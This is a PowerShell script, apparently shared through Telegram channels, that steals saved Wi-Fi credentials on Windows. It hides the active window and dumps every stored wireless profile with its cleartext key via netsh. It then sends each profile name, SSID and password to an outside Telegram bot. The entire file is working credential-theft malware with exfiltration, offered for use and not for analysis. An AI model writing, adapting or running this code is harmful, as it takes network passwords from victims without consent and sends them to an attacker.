$botToken = "TOKEN @rmsup"
$chatID = "ID @secbaz"
# https://t.me/rmsup
function Send-TelegramMessage {
    param (
        [string]$message
    )

    $url = "https://api.telegram.org/bot$($botToken)/sendMessage"
    $parameters = @{
        chat_id = $chatID
        text = $message
    }
    
    Invoke-RestMethod -Uri $url -Method Post -ContentType "application/json" -Body (ConvertTo-Json $parameters) | Out-Null
}

Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class CustomWin32 {
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
        [DllImport("user32.dll")]
        public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
        [DllImport("user32.dll", SetLastError=true)]
        public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
    }
"@

# https://t.me/secbaz
$HWND = [CustomWin32]::GetForegroundWindow()
[CustomWin32]::ShowWindow($HWND, 6)
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.Line.Split(":")[1].Trim() }
if ($profiles.Count -eq 0) {
    Send-TelegramMessage -message "No Wi-Fi profiles found on this system."
    $WM_CLOSE = 0x0010
    [CustomWin32]::PostMessage($HWND, $WM_CLOSE, 0, 0)
}

foreach ($profile in $profiles) {
    $profileDetails = netsh wlan show profile name="$profile" key=clear
    $profileName = ($profileDetails | Select-String "Profile").Line.Split(":")[1].Trim()
    $ssid = ($profileDetails | Select-String "SSID name").Line.Split(":")[1].Trim()
    $authentication = ($profileDetails | Select-String "Authentication").Line.Split(":")[1].Trim()
    $keyContent = ($profileDetails | Select-String "Key Content").Line.Split(":")[1].Trim()
    $message = @"
Profile Name: $profileName
SSID: $ssid
Authentication: $authentication
Key Content: $keyContent
"@
    Send-TelegramMessage -message $message
}

# https://t.me/rmsup https://t.me/secbaz
$WM_CLOSE = 0x0010
[CustomWin32]::PostMessage($HWND, $WM_CLOSE, 0, 0)